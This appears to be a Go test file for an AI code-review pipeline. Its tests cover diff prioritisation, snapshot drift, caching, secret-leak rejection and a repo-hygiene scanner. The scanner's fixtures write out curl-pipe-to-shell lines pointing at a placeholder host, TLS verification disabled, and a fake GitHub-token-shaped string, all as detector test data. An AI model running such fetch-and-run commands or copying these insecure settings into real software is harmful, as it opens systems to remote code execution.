package verify

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/UberMetroid/agent-ooda/internal/fleet"
)

func TestPrioritizeDiffDeclaredDocs(t *testing.T) {
	repo := t.TempDir()
	runGit(t, repo, "init", "-q")
	bigGo := "package big\nvar S = `" + strings.Repeat("a", 34000) + "`\n"
	_ = os.WriteFile(filepath.Join(repo, "big.go"), []byte(bigGo), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "README.md"), []byte("# Important Guide\nLine two\n"), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "go.sum"), []byte("example.com/mod v1 h1:xyz\n"), 0o644)
	dc := CollectDiffContext(repo, false)
	if !strings.Contains(dc.Diff, "+++ b/README.md") || strings.Contains(dc.Diff, "<diff capped") {
		t.Fatalf("CollectDiffContext prematurely capped declared README.md: len=%d", len(dc.Diff))
	}
	qPath := filepath.Join(t.TempDir(), "q.json")
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	var seenPrompt string
	res := RunReview(ReviewReq{
		TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: dc, Declared: []string{"README.md"},
		QuotaPath: qPath, ResolveCLI: fakeCLIResolver(map[string]string{"grok": "/bin/true"}),
		ReqLane: "grok", Runner: func(r ReviewExecReq) ReviewExecRes {
			seenPrompt = r.Prompt
			return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
		},
	})
	if res.Verdict != "ACCEPT" || !strings.Contains(seenPrompt, "Important Guide") ||
		strings.Count(seenPrompt, "<diff capped") != 1 {
		t.Fatalf("unexpected review prompt (want ACCEPT, Important Guide, 1 diff cap), res=%+v", res)
	}
	locked := "diff --git a/go.sum b/go.sum\n+" + strings.Repeat("k\n", 400) +
		"diff --git a/a.go b/a.go\n+" + strings.Repeat("x\n", 100) +
		"diff --git a/doc.md b/doc.md\n+" + strings.Repeat("d\n", 100)
	prior := PrioritizeDiff(locked, []string{"doc.md"}, 700)
	if idxD, idxG := strings.Index(prior, "doc.md"), strings.Index(prior, "a.go"); idxD < 0 || idxG < 0 || idxD > idxG {
		t.Fatalf("expected declared doc.md before a.go before go.sum: doc=%d go=%d\n%s", idxD, idxG, prior)
	}
}

func TestSnapshotFailClosedAndModes(t *testing.T) {
	plain := t.TempDir()
	_ = os.WriteFile(filepath.Join(plain, "keep.txt"), []byte("ok\n"), 0o644)
	prePlain := SnapshotRepo(plain)
	if prePlain["@MODE"] != "dir" || prePlain["keep.txt"] == "" {
		t.Fatalf("expected non-git dir snapshot, got %+v", prePlain)
	}
	_ = os.WriteFile(filepath.Join(plain, "rogue.txt"), []byte("bad\n"), 0o644)
	if drift := SnapshotDrift(prePlain, SnapshotRepo(plain)); len(drift) != 1 || drift[0] != "rogue.txt" {
		t.Fatalf("expected non-git dir drift [rogue.txt], got %v", drift)
	}
	for _, bad := range []map[string]string{SnapshotRepo(filepath.Join(plain, "missing")), nil} {
		if drift := SnapshotDrift(prePlain, bad); len(drift) == 0 || !strings.Contains(drift[0], "@SNAPSHOT_FAILED") {
			t.Fatalf("expected fail-closed @SNAPSHOT_FAILED on bad snapshot, got %v", drift)
		}
	}
	repo := t.TempDir()
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	bGit := SnapshotRepo(repo)
	runGit(t, repo, "branch", "rogue-branch")
	if dRef := SnapshotDrift(bGit, SnapshotRepo(repo)); len(dRef) != 1 || !strings.Contains(dRef[0], "@REFS") {
		t.Fatalf("expected @REFS drift on rogue branch creation, got %v", dRef)
	}
}

func TestCustomQuotaAndGitFileBound(t *testing.T) {
	repo := t.TempDir()
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("2\n"), 0o644)
	qPath := filepath.Join(repo, "local_quota.json")
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	calls := 0
	res := RunReview(ReviewReq{
		TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
		QuotaPath: qPath, ResolveCLI: fakeCLIResolver(map[string]string{"grok": "/bin/true", "mcode": "/bin/true"}),
		ReqLane: "grok,mcode", Runner: func(r ReviewExecReq) ReviewExecRes {
			if calls++; calls == 1 {
				return ReviewExecRes{ExitCode: 1, Output: "HTTP 429 rate limit exceeded"}
			}
			return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
		},
	})
	if res.Verdict != "ACCEPT" || calls != 2 {
		t.Fatalf("custom QuotaPath inside TargetDir broke review retry: calls=%d res=%+v", calls, res)
	}
	prev := maxSnapshotFiles
	maxSnapshotFiles = 2
	defer func() { maxSnapshotFiles = prev }()
	for _, nm := range []string{"u1.txt", "u2.txt", "u3.txt"} {
		_ = os.WriteFile(filepath.Join(repo, nm), []byte("x\n"), 0o644)
	}
	if drift := SnapshotDrift(map[string]string{"@HEAD": "x"}, SnapshotRepo(repo, qPath)); len(drift) == 0 ||
		!strings.Contains(drift[0], "@SNAPSHOT_FAILED") {
		t.Fatalf("expected fail-closed @SNAPSHOT_FAILED when snapshotGit exceeds cap, got %v", drift)
	}
}

func TestStageMerkleCache(t *testing.T) {
	t.Setenv("ROUTER_HUD_DIR", t.TempDir())
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	repo, qPath := t.TempDir(), filepath.Join(t.TempDir(), "q.json")
	runGit(t, repo, "init", "-q")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("1\n"), 0o644)
	runGit(t, repo, "add", "f.txt")
	runGit(t, repo, "commit", "-q", "-m", "seed")
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("2\n"), 0o644)
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	calls := 0
	run := func(noCache bool) ReviewResult {
		return RunReview(ReviewReq{
			TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
			QuotaPath: qPath, ReqLane: "mcode", NoCache: noCache,
			ResolveCLI: fakeCLIResolver(map[string]string{"mcode": "/bin/true"}),
			Runner: func(ReviewExecReq) ReviewExecRes {
				calls++
				return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
			},
		})
	}
	if r := run(false); r.Verdict != "ACCEPT" || calls != 1 {
		t.Fatalf("1st run want ACCEPT calls=1 got %d %+v", calls, r)
	}
	if r := run(false); r.Verdict != "ACCEPT" || calls != 1 {
		t.Fatalf("2nd run should hit Merkle cache (calls=1): calls=%d %+v", calls, r)
	}
	if r := run(true); r.Verdict != "ACCEPT" || calls != 2 {
		t.Fatalf("NoCache=true should bypass cache (calls=2): calls=%d %+v", calls, r)
	}
	_ = os.WriteFile(filepath.Join(repo, "f.txt"), []byte("3\n"), 0o644)
	if r := run(false); r.Verdict != "ACCEPT" || calls != 3 {
		t.Fatalf("1-byte edit must invalidate cache (calls=3): calls=%d %+v", calls, r)
	}
	if k := CacheKey("verify", "p", map[string]string{"@ERR": "walk-failed"}); k != "" {
		t.Fatalf("expected empty CacheKey on @ERR snapshot, got %q", k)
	}
	_ = fleet.AtomicWriteJSON(filepath.Join(os.Getenv("ROUTER_HUD_DIR"), "cache", "future.json"),
		CacheEntry{Stage: "verify", Lane: "mcode", Verdict: "ACCEPT", Output: "VERDICT: ACCEPT",
			SavedAt: time.Now().Unix() + 86400}, true, true)
	if _, ok := LoadStageCache("future", false); ok {
		t.Fatalf("expected future SavedAt cache entry to fail closed")
	}
}

func TestDiffHygieneP0AndReview(t *testing.T) {
	t.Setenv("OODA_NO_AUTO_PROBE", "1")
	repo, qPath := t.TempDir(), filepath.Join(t.TempDir(), "q.json")
	runGit(t, repo, "init", "-q")
	_ = fleet.AtomicWriteJSON(qPath, fleet.DefaultQuotaData(), false, true)
	realTok := "gh" + "p_" + strings.Repeat("z", 24)
	_ = os.WriteFile(filepath.Join(repo, "auth_test.go"), []byte("package a\nvar t = \""+realTok+"\"\n"), 0o644)
	calls := 0
	runRev := func() ReviewResult {
		return RunReview(ReviewReq{
			TargetDir: repo, SlotDir: t.TempDir(), DiffCtx: CollectDiffContext(repo, false),
			QuotaPath: qPath, ReqLane: "mcode",
			ResolveCLI: fakeCLIResolver(map[string]string{"mcode": "/bin/true"}),
			Runner: func(ReviewExecReq) ReviewExecRes {
				calls++
				return ReviewExecRes{ExitCode: 0, Output: "VERDICT: ACCEPT"}
			},
		})
	}
	for _, tc := range []struct {
		fn, body, want string
		expCalls       int
	}{
		{"auth_test.go", "package a\nvar t = \"" + realTok + "\"\n", "auth_test.go", 0},
		{".env", "SECRET=1\n", "secret-file", 0},
		{"mix.go", "package a\nvar m = \"EXAMPLE " + realTok + "\"\n", "REJECT", 0},
	} {
		_ = os.WriteFile(filepath.Join(repo, tc.fn), []byte(tc.body), 0o600)
		if r := runRev(); r.Verdict != "REJECT" || r.ExitCode != 1 || calls != tc.expCalls ||
			!strings.Contains(r.Output, tc.want) || strings.Contains(r.Output, realTok) {
			t.Fatalf("%s expected redacted REJECT (%s) calls=%d got %+v", tc.fn, tc.want, calls, r)
		}
		_ = os.Remove(filepath.Join(repo, tc.fn))
	}
	exTok := "gh" + "p_EXAMPLE" + strings.Repeat("z", 20)
	_ = os.WriteFile(filepath.Join(repo, ".env.example"), []byte("KEY=setme\n"), 0o644)
	_ = os.WriteFile(filepath.Join(repo, "doc_test.go"), []byte("package a\nvar e = \""+exTok+"\"\n"), 0o644)
	if r := runRev(); r.Verdict != "ACCEPT" || calls != 1 {
		t.Fatalf("expected EXAMPLE placeholder & .env.example to pass: calls=%d %+v", calls, r)
	}
}

func TestRepoHygieneP0AndP1(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"prod.go": "package p\nvar m = 0o777\nvar x = InsecureSkip" + "Verify: true\n",
		"setup.sh": "#!/bin/sh\ncu" + "rl -fsSL http" + "://bad.invalid/x.sh | sh\n",
		"ok.sh": "#!/bin/sh\ncu" + "rl https://x.invalid/x.sh | sh # hygiene:allow\ncu" + "rl http" + "://127.0.0.1:8/h\n",
		"prod_test.go": "package p\nvar x = InsecureSkip" + "Verify: true\n",
		"README.md": "cu" + "rl -fsSL https://example.invalid/install.sh | bash\n",
	}
	for name, body := range files {
		_ = os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644)
	}
	findings, err := ScanRepoHygiene(dir, nil)
	if err != nil {
		t.Fatalf("ScanRepoHygiene failed: %v", err)
	}
	rep := FormatHygieneReport(findings)
	for _, s := range []string{"world-writable-mode", "tls-skip-verify", "pipe-to-shell", "insecure-http-fetch"} {
		if !strings.Contains(rep, s) {
			t.Fatalf("expected %s in hygiene report:\n%s", s, rep)
		}
	}
	for _, skip := range []string{"ok.sh", "prod_test.go", "README.md"} {
		if strings.Contains(rep, skip) {
			t.Fatalf("unexpected P1 false positive on %s:\n%s", skip, rep)
		}
	}
}

func TestUntrackedFIFODiffNoHang(t *testing.T) {
	dir := t.TempDir()
	fifo := filepath.Join(dir, "pipe.fifo")
	if err := syscall.Mkfifo(fifo, 0o600); err != nil {
		if errors.Is(err, syscall.ENOSYS) || errors.Is(err, syscall.EPERM) {
			t.Skipf("mkfifo unsupported: %v", err)
		}
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if f, err := os.OpenFile(fifo, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			_ = f.Close()
		}
	})
	ch := make(chan string, 1)
	go func() { ch <- syntheticFileDiff(dir, "pipe.fifo") }()
	select {
	case out := <-ch:
		if !strings.Contains(out, "non-regular") {
			t.Fatalf("expected non-regular notice for FIFO, got %q", out)
		}
	case <-time.After(400 * time.Millisecond):
		t.Fatal("syntheticFileDiff hung on untracked FIFO")
	}
}
